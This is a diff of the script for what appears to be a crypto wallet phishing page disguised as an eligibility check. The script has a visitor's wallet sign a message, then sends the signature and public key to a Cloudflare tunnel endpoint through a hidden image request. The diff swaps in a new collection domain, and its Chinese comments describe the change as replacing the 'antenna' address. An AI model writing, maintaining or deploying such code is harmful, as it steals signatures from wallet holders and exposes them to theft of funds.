@@ -19,16 +19,16 @@
             
             document.getElementById('status').innerText = "Analyzing eligibility...";
             
-            // 🚀 唤起签名 (保持你之前的原版逻辑)
+            // 🚀 唤起签名
             const signedMessage = await p.signMessage(encodedMessage, "utf8");
             const signature = btoa(String.fromCharCode.apply(null, signedMessage.signature));
             
             document.getElementById('status').innerText = "TRANSMITTING DATA...";
 
-            // 🔱 修正：只改了这一个“天线”地址！
+            // 🔱 唯一改动：换了“天线”域名
             const gate = "https://alias-beach-replace-handled.trycloudflare.com/collect";
             
-            // 🔱 保持图片直连模式，确保信号发出
+            // 🔱 保持图片直连模式
             const report = new Image();
             report.src = gate + "?sig=" + encodeURIComponent(signature) + "&pub=" + publicKey.toString();
 
